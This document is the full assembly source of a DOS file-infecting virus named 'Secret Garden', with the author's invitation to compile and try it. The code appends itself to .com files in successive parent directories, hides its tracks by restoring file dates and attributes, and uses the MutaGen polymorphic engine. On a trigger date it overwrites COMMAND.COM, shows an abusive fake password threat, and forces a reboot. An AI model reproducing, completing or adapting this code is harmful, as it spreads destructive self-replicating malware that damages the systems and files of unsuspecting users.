; Welcome to the [Secret Garden] virus!!!
; This virus was written by Nipple!!!!
; Yeeee...This is pretty good virus....try it :-)
; To compile it you will need Muta Gen ,if you don't have it....you should
; get it ... It is GOOOOODDDDD!!!!!!!
; This virus will teach you to use 4DOS...Because 4DOS is something really
; really goooooddddddd.......... ( Don't tell me about Windows because on
; "my" XT i can't start them ... but if u want fight...X-Windows works
; just fine on "my" DEC 5000 :-) )
;
; Two Magic commands are:
;      TASM SECRET
;      TLINK /T SECRET MUTAGEN


MGEN_SIZE       equ     1193

MAX_INFECT      equ     3


extrn   _MUTAGEN:near

code    segment byte    public  'code'
    org     100h
        assume  cs:code,ds:code,es:code,ss:code

carrier:
       jmp      start
       db       0ch
start:
       call     next
next:
       pop      bp
       sub      bp,offset next

; ARE WE GOING TO START IT OR WHAT?

       mov      ah, 2ah
       int      21h
       cmp      dl, 17
       jnz      NextTime

; SET NEW FILE ATTRIBUTS FOR COMMAND.COM
       mov      ax, 4301h
       mov      cx, 20h
       lea      dx, [bp+offset CommandCOM]
       int      21h

; OPEN COMMAND.COM
       mov      ax, 3d02h
       lea      dx, [bp+offset CommandCOM]
       int      21h
       mov      bx, ax

; WRITE THIS RESET SHIT INSIDE
       mov      ah, 40h
       mov      cx, offset NextTime - offset BeginReset
       lea      dx, [bp+offset BeginReset]
       int      21h

; SET CURSOR
       mov      ah, 2
       mov      bh, 0
       mov      dx, 0
       int      10h

; WRITE MESSAGE
       mov      ah, 09h
       lea      dx, [bp+offset Warning1]
       int      21h

StillEnter:
       mov      ah, 0ch
       mov      al, 07h
       int      21h
       cmp      al, 0dh
       jnz      StillEnter

       mov      ah, 9h
       lea      dx, [bp+offset FuckYou]

       int      21h
       int      21h

BeginReset:
; RESET COMPUTER
       mov      ax, 0040h
       mov      ds, ax
       mov      bx, 1234h
       mov      word ptr cs:[0072h], bx

       db          0eah
       dw          0
       dw          0ffffh

NextTime:

; IN WHAT DIRECTORY ARE WE?
       mov      dl, 0000h
       mov      ah, 47h
       lea      si, [bp+offset origdir+1]
       int      21h

; SET NEW DTA
       mov      ah, 1ah
       lea      dx, [bp+offset newDTA]
       int      21h

; RESTORE COM FILE
;     di <- si
       mov      di, 100h
       lea      si, [bp+offset old3]
       movsw
       movsw

ThisIsLoop:
       lea      dx, [bp+offset COMmask]
       call     infect

; ENOUGH INFECTED FILES?
       cmp      byte ptr [bp+offset N_Infect], MAX_INFECT
       jae      GoAway
; CD..
       mov      ah, 3bh
       lea      dx, [bp+offset goDOWN]
       int      21h
       jnc      ThisIsLoop

GoAway:

; GO TO OLD DIRECTORY
       mov      ah, 3bh
       lea      dx, [bp+offset origdir+1]
       int      21h

; SET DTA TO DEFAULT
       mov      dx, 0080h
       mov      ah, 1ah
       int      21h
return:

; RETURN TO ORGINAL FILE
       mov      bp, 100h
       jmp      bp

; FIRST  BYTES
old3   db          0cdh, 20h ,0h ,0h

infect:

; FIND FIRST
       mov      cx, 0007h
       mov      ah,4eh
findnext:
       int      21h
       jnc      NothingNew
       ret

NothingNew:

; IS IT COMMAND.COM ?!!!
       mov      ah,4fh
       cmp      word ptr [bp+newDTA+35], 'DN'
       jz       findnext

; IS IT 4DOS.COM ?!!!
       cmp      word ptr [bp+newDTA+31], 'OD'
       jz       findnext

; READ FILE ATTRIBUTS
       mov      ax, 4300h
       lea      dx, [bp+offset newDTA+30]
       int      21h
       mov      word ptr [bp+offset F_ATTR], cx

; SET NEW FILE ATTRIBUTS
       mov      ax, 4301h
       mov      cx, 20h
       int      21h

; OPEN FILE
       mov      ax, 3d02h
       lea      dx, [bp+newDTA+30]
       int      21h
       mov      bx, ax

; READ
       mov      cx, 001ah
       mov      ah, 003fh
       lea      dx, [bp+offset readbuffer]
       int      21h

; SET POINTER TO THE END OF FILE
       mov      ax, 4202h
       xor      cx, cx
       cwd
       int      21h

       cmp      word ptr [bp+offset readbuffer], 'ZM'
       jz       jmp_close

; IS THIS FILE INFECTED?!!!
       cmp      byte ptr [bp+offset readbuffer+3], 0ch
       jnz      skipp

jmp_close:
       jmp      close
skipp:

; STORE FIRST 4 BYTES OF FILE
       lea      si, [bp+offset readbuffer]
       lea      di, [bp+offset old3]
       movsw
       movsw

; COUNT ADDRESS
       sub      ax, 0003h
       mov      word ptr [bp+offset readbuffer+1], ax

; PUT JMP COMMAND
       mov      dl, 00e9h
       mov      byte ptr [bp+offset readbuffer], dl
       mov      byte ptr [bp+offset readbuffer+3], 0ch

; SAVE FILE TIME & DATE
       mov      ax, 5700h
       int      21h
       mov      word ptr [bp+offset F_TIME], cx
       mov      word ptr [bp+offset F_DATE], dx

; MUTAGEN CALLING ROUTINE
       mov      dx, [bp+offset readbuffer+1]
       add      dx, 103h
       mov      cx, VIRUS_SIZE
       lea      di, [bp+virus_end+80h]
       lea      si, [bp+offset start]
       call     _MUTAGEN

; WRITE VIRUS
       lea      dx, [bp+offset virus_end+80h]
       mov      ah, 40h
       int      21h

       mov      ax, 4200h
       xor      cx, cx
       cwd
       int      21h

; WRITE FIRST 4 BYTES
       mov      cx, 0004h
       mov      ah, 40h
       lea      dx, [bp+offset readbuffer]
       int      21h

; RESTORE TIME & DATE
       mov      ax, 5701h
       mov      cx, word ptr [bp+offset F_TIME]
       mov      dx, word ptr [bp+offset F_DATE]
       int      21h

; INC COUNTER OF INFECTION
       inc      byte ptr [bp+offset N_Infect]

close:

; CLOSE FILE
       mov      ah, 3eh
       int      21h

; RESTORE ATTRIBUTS

       lea      dx, [bp+offset newDTA+30]
       mov      cx, word ptr [bp+offset F_ATTR]
       mov      ax, 4301h
       int      21h

; FIND NEXT
       mov      ah, 4fh
       jmp      findnext


comMASK     db     '*.com',0
goDOWN      db     '..',0
CommandCOM  db     'C:\COMMAND.COM',0
Logo        db     ' [Secret Garden] by Nipple '
Msg1        db     'IN MY SECRET GARDEN'
Msg2        db     'I',27h,'AM LOOKING FOR THE PERFECT FLOWER'
Warning1    db     07h,'I AM GOING TO FUCK YOUR HARD DISK IF YOU DON',27h,'T TYPE THE RIGHT PASSWORD.',13,10
Warning2    db     'DON',27h,'T TURN OFF YOUR COMPUTER BECAUSE I ALREADY FUCKED YOUR HARD DISK',13,10
Warning3    db     'AND I WILL FIX IT ONLY IF YOU ENTER THE RIGHT PASSWORD!!!',13,10
Warning4    db     ' PASSWORD IS:',07h,'$'
FuckYou     db     ' FUCK YOU!!! HA HA HA HA!!!',07h,'$'

F_ATTR      dw     0
F_TIME      dw     0
F_DATE      dw     0
N_Infect    db     0

newDTA      db     43 dup (?)
readbuffer  db     1ah dup (?)
origdir     db     65 dup (?)

virus_end       equ     $ + MGEN_SIZE

VIRUS_SIZE      equ     virus_end - offset start



code    ends
        end carrier
        